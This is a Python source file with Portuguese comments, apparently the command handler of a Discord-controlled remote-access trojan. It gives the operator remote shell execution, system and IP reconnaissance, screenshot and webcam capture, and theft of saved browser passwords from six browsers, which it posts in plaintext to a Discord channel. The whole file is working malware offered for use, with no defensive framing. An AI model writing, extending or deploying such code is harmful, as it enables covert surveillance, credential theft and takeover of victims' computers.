# Gerenciador de comandos que registra e gerencia os comandos do bot
# Início: 01/05/2025 | Última atualização: 01/05/2025

import discord
import asyncio
import platform
import os
import ctypes
import time
from datetime import datetime

from utils.permissions import is_authorized, is_in_session_channel
from commands.execute_command import execute_command
from commands.get_ip_info import get_ip_info
from commands.camera import take_webcam_photo
from commands.browser_passwords import get_browser_passwords

def register_commands(client):
    @client.command()
    @is_authorized()
    @is_in_session_channel()
    async def cmd(ctx, *, command=None):
        if not command:
            await ctx.send("```[+] Uso: !cmd <comando>```")
            return
        
        try:
            processing_msg = await ctx.send("```[*] Executando comando...```")
            
            result = await asyncio.to_thread(execute_command, command)
            
            if not result.strip():
                result = "[i] Comando executado, mas não retornou saída"
            
            if len(result) > 1900:
                await processing_msg.delete()
                chunks = [result[i:i+1900] for i in range(0, len(result), 1900)]
                for i, chunk in enumerate(chunks):
                    await ctx.send(f"```[Parte {i+1}/{len(chunks)}]\n{chunk}```")
            else:
                await processing_msg.edit(content=f"```{result}```")
        
        except Exception as e:
            print(f"[!] Erro ao executar comando '{command}': {str(e)}")
            await ctx.send(f"```[!] Erro ao executar comando: {str(e)}```")
    
    @client.command()
    @is_authorized()
    @is_in_session_channel()
    async def info(ctx):
        try:
            ip, flag = get_ip_info()
            os_info = f"{platform.system()} {platform.release()}"
            user = os.getlogin()
            hostname = platform.node()
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            admin_status = "Sim" if is_admin else "Não"
            
            uptime_seconds = time.time() - client.session_info.get("start_time", time.time())
            uptime_str = time.strftime("%H:%M:%S", time.gmtime(uptime_seconds))
            
            info_message = (
                f"**Informações do Sistema**\n"
                f"```\n"
                f"Sistema Operacional: {os_info}\n"
                f"Nome do Host: {hostname}\n"
                f"Usuário: {user}\n"
                f"IP: {ip} ({flag})\n"
                f"Privilégios de Admin: {admin_status}\n"
                f"Tempo de Execução: {uptime_str}\n"
                f"```"
            )
            
            await ctx.send(info_message)
        
        except Exception as e:
            await ctx.send(f"```[!] Erro ao obter informações: {str(e)}```")
    

    @client.command()
    @is_authorized()
    @is_in_session_channel()
    async def screenshot(ctx):
        try:
            data = datetime.now()
            hora_formatada = data.strftime("%d/%m/%Y")
            data_formatada = data.strftime("%H:%M:%S")
            processing_msg = await ctx.send(f"```[+] screenshot {data_formatada} : {hora_formatada}```")
            
            from commands.screenshot import take_screenshot
            
            filepath, error = await asyncio.to_thread(take_screenshot)
            
            if error:
                await processing_msg.edit(content=f"```[!] Erro ao capturar screenshot: {error}```")
                return
                
            await ctx.send(file=discord.File(filepath))
            
            try:
                os.remove(filepath)
            except:
                pass
                
        except Exception as e:
            await ctx.send(f"```[!] Erro: {str(e)}```")

    @client.command()
    @is_authorized()
    @is_in_session_channel()
    async def cam(ctx):
        try:
            data = datetime.now()
            hora_formatada = data.strftime("%d/%m/%Y")
            data_formatada = data.strftime("%H:%M:%S")
            processing_msg = await ctx.send(f"```[+] webcam {data_formatada} : {hora_formatada}```")
            
            filepath, error = await asyncio.to_thread(take_webcam_photo)
            
            if error:
                await processing_msg.edit(content=f"```[!] erro ao capturar webcam: {error}```")
                return
                
            await ctx.send(file=discord.File(filepath))
            
            try:
                os.remove(filepath)
            except:
                pass
                
        except Exception as e:
            await ctx.send(f"```[!] erro: {str(e)}```")

    @client.command()
    @is_authorized()
    @is_in_session_channel()
    async def password(ctx):
        try:
            processing_msg = await ctx.send("```[*] obtendo senhas salvas dos navegadores...```")
            
            passwords, error = await asyncio.to_thread(get_browser_passwords)
            
            if error:
                await processing_msg.edit(content=f"```[!] erro ao recuperar senhas: {error}```")
                return
                
            chrome_count = len(passwords["chrome"])
            edge_count = len(passwords["edge"])
            brave_count = len(passwords["brave"])
            opera_count = len(passwords["opera"])
            opera_gx_count = len(passwords["opera_gx"])
            firefox_count = len(passwords["firefox"])
            total_count = chrome_count + edge_count + brave_count + opera_count + opera_gx_count + firefox_count
            
            if total_count == 0:
                await processing_msg.edit(content="```[i] nenhuma senha encontrada nos navegadores```")
                return
                
            await processing_msg.edit(content=f"```[+] senhas encontradas: {total_count} ({chrome_count} chrome, {edge_count} edge, {brave_count} brave, {opera_count} opera, {opera_gx_count} opera gx, {firefox_count} firefox)```")
            
            for browser, pwd_list in passwords.items():
                if not pwd_list:
                    continue
                    
                browser_name = browser.capitalize()
                content = f"**[+] senhas do {browser_name} ({len(pwd_list)})**\n```"
                
                for i, pwd in enumerate(pwd_list[:20]):
                    url_short = pwd["url"][:40] + "..." if len(pwd["url"]) > 40 else pwd["url"]
                    content += f"\n{i+1}. URL: {url_short}\n   Usuário: {pwd['username']}\n   Senha: {pwd['password']}\n"
                
                if len(pwd_list) > 20:
                    content += f"\n[...] + {len(pwd_list) - 20} senhas não exibidas\n"
                    
                content += "```"
                
                if len(content) > 1900:
                    chunks = [content[i:i+1900] for i in range(0, len(content), 1900)]
                    for chunk in chunks:
                        if not chunk.endswith("```"):
                            chunk += "```"
                        await ctx.send(chunk)
                else:
                    await ctx.send(content)
                
        except Exception as e:
            await ctx.send(f"```[!] erro ao recuperar senhas: {str(e)}```")